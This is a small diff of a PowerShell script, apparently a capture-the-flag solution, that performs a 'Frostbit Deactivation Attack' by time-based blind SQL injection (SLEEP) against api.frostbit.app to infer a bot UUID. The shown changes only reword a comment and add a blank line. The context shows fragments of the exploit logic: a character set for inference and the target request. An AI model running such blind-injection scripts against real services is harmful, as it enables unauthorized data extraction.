@@ -85,9 +85,8 @@ function Is-UUID {
 }
 
 #
-# Create array of chars a..z, A..Z, 0..9, -, _ for later data inference ops.
-# Explicity cast each array object to a string since powershell will create
-# a mixed-object array.
+# Create array of chars a..z, 0..9, -, _ for later data inference ops.
+# Explicity cast each array object to a string since powershell will create a mixed-object array.
 #
 $letters = @('a'..'z') + ('0'..'9') + '-' + '_'
 $letters = $letters | ForEach-Object { [string]$_ }
@@ -306,3 +305,4 @@ $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v
 $swtotal.Stop()
 "`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
 "Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
+
